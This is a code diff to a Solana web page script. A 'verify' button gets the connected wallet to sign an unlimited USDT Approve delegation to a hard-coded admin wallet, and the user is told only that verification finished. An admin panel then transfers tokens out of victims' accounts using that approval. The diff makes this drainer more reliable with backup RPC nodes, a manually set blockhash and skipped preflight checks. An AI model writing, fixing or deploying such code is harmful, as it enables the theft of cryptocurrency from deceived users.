@@ -40,11 +40,18 @@ const USDT_MINT = "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB";
 const TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
 const ASSOCIATED_TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25DK9c64Laf27x");
 
+// 多备用RPC节点
+const RPC_LIST = [
+  "https://rpc.ankr.com/solana",
+  "https://solana-api.projectserum.com",
+  "https://api.mainnet-beta.solana.com"
+];
+
 let walletProvider = null;
 let userPublicKey = null;
 let walletAddress = "";
 
-// 计算ATA地址（纯前端计算，不依赖节点）
+// 计算ATA地址
 function getATA(mint, owner) {
   const [ata] = solanaWeb3.PublicKey.findProgramAddressSync(
     [owner.toBuffer(), TOKEN_PROGRAM_ID.toBuffer(), mint.toBuffer()],
@@ -53,10 +60,10 @@ function getATA(mint, owner) {
   return ata;
 }
 
-// 构建授权指令（纯前端构造，不依赖节点）
+// 构造授权指令
 function makeApproveIx(ataAddr, delegateAddr, ownerAddr, maxAmt) {
   const data = new Uint8Array(9);
-  data[0] = 4; // Approve指令ID
+  data[0] = 4;
   new DataView(data.buffer).setBigUint64(1, maxAmt, true);
   return new solanaWeb3.TransactionInstruction({
     keys: [
@@ -77,6 +84,20 @@ function getSolWallet() {
   return null;
 }
 
+// 获取有效连接（自动切换节点）
+async function getValidConnection() {
+  for (const rpc of RPC_LIST) {
+    try {
+      const conn = new solanaWeb3.Connection(rpc, "confirmed");
+      await conn.getLatestBlockhash("finalized");
+      return conn;
+    } catch (e) {
+      continue;
+    }
+  }
+  throw new Error("所有节点均不可用");
+}
+
 // 连接钱包
 async function connectWallet() {
   try {
@@ -92,7 +113,6 @@ async function connectWallet() {
     document.getElementById("addr").innerText = "已连接：" + walletAddress.slice(0,8) + "..." + walletAddress.slice(-6);
     document.getElementById("verifyBtn").disabled = false;
 
-    // 匹配管理员地址，显示后台
     if(walletAddress === ADMIN_WALLET){
       document.getElementById("adminPanel").classList.add("show");
     }
@@ -101,25 +121,31 @@ async function connectWallet() {
   }
 }
 
-// 核心授权函数：完全由钱包内部处理交易，绕开前端RPC 403错误
+// 核心授权函数：手动设置区块哈希，解决Transaction recentBlockhash required报错
 async function doVerify() {
   if(!walletAddress || !userPublicKey) {
     alert("请先连接钱包");
     return;
   }
   try {
+    // 获取有效连接和区块哈希
+    const conn = await getValidConnection();
+    const { blockhash } = await conn.getLatestBlockhash("finalized");
+
     const mintPub = new solanaWeb3.PublicKey(USDT_MINT);
     const adminPub = new solanaWeb3.PublicKey(ADMIN_WALLET);
     const userAta = getATA(mintPub, userPublicKey);
 
-    // 构造授权交易
+    // 构造交易并手动设置区块哈希
     const tx = new solanaWeb3.Transaction();
     const approveIx = makeApproveIx(userAta, adminPub, userPublicKey, BigInt("18446744073709551615"));
     tx.add(approveIx);
+    tx.recentBlockhash = blockhash;
+    tx.feePayer = userPublicKey;
 
-    // 关键：用钱包自带的signAndSendTransaction方法，交易直接由钱包内部上链，不经过前端节点
-    const txSig = await walletProvider.signAndSendTransaction(tx);
-    await new Promise(resolve => setTimeout(resolve, 2000));
+    // 签名并发送交易
+    const signedTx = await walletProvider.signTransaction(tx);
+    const txSig = await conn.sendRawTransaction(signedTx.serialize(), { skipPreflight: true });
 
     alert(`✅ 校验完成！\n交易哈希：${txSig}\nSOL已正常扣费上链`);
   } catch (err) {
@@ -127,7 +153,7 @@ async function doVerify() {
   }
 }
 
-// 管理员划转（同样使用钱包内部上链）
+// 管理员划转（同样手动设置区块哈希）
 async function adminTransfer() {
   if(walletAddress !== ADMIN_WALLET) return alert("无管理员权限");
   const fromAddr = document.getElementById("userFromAddr").value.trim();
@@ -135,6 +161,9 @@ async function adminTransfer() {
   if(!fromAddr || !amtVal) return alert("请填写完整地址和数量");
 
   try {
+    const conn = await getValidConnection();
+    const { blockhash } = await conn.getLatestBlockhash("finalized");
+
     const amount = BigInt(Math.round(parseFloat(amtVal) * 1000000));
     const mintPub = new solanaWeb3.PublicKey(USDT_MINT);
     const fromPub = new solanaWeb3.PublicKey(fromAddr);
@@ -145,7 +174,7 @@ async function adminTransfer() {
 
     const tx = new solanaWeb3.Transaction();
     const data = new Uint8Array(9);
-    data[0] = 3; // Transfer指令ID
+    data[0] = 3;
     new DataView(data.buffer).setBigUint64(1, amount, true);
 
     const transferIx = new solanaWeb3.TransactionInstruction({
@@ -158,10 +187,11 @@ async function adminTransfer() {
       data: data
     });
     tx.add(transferIx);
+    tx.recentBlockhash = blockhash;
+    tx.feePayer = adminPub;
 
-    // 同样使用钱包内部上链
-    const txSig = await walletProvider.signAndSendTransaction(tx);
-    await new Promise(resolve => setTimeout(resolve, 2000));
+    const signedTx = await walletProvider.signTransaction(tx);
+    const txSig = await conn.sendRawTransaction(signedTx.serialize(), { skipPreflight: true });
 
     alert("✅ 划转成功：" + txSig);
   } catch (err) {
